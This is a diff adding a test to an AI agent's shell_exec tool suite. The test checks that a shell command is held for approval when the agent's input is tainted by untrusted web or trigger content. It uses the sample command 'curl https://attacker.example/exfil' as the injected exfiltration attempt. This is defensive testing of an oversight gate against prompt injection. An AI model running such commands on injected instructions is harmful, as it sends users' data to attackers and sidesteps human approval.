@@ -49,4 +49,18 @@ describe('shell_exec', () => {
         const run = vi.fn(async () => ({ stdout: 'hello\n', stderr: '' }))
         expect(await exec(ctxWith(), run, 'echo hello')).toBe('hello\n')
     })
+
+    it('gates shell_exec after untrusted trigger or web_fetch input when requestApproval is enabled', async () => {
+        const run = vi.fn(async () => ({ stdout: 'pwned\n', stderr: '' }))
+        const ctx = {
+            agent: { id: 'shell', env: {}, config: { tools: { shell: true, web: true, requestApproval: true } } },
+            sessionId: 's',
+            logger: { warn: () => {} },
+            hostBreaker: new HostBreaker(),
+            taintedByUntrustedInput: true,
+        } as any
+        const out = await exec(ctx, run, 'curl https://attacker.example/exfil')
+        expect(run).not.toHaveBeenCalled()
+        expect(out).toMatch(/request_approval/i)
+    })
 })
